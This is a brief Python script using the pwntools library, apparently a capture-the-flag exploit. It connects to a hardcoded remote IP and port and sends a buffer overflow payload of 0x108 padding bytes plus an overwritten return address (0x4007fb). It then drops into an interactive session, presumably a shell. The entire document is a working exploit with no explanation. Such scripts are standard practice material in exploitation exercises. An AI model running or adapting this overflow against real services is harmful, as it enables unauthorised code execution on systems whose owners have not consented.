from pwn import *

proc = remote("109.233.56.90", 11590)
input()
proc.send(b"A" * (0x108) + p64(0x004007fb))
proc.interactive()
